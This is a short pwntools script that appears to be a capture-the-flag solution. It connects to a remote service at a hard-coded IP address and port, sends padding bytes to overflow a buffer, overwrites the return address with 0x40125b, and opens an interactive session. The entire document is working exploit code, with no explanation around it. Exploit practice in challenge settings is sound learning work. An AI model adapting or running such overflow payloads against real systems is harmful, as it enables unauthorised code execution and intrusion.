from pwn import *

context.arch="amd64"
context.terminal = ['xfce4-terminal', '-e']

#p = process("./chall")
p = remote("13.38.58.247", 1337)
p.send(b"A"*20+b"\x50")
print(p.recv())
p.sendline(b"A"*39+p64(0x40125b))

p.interactive()
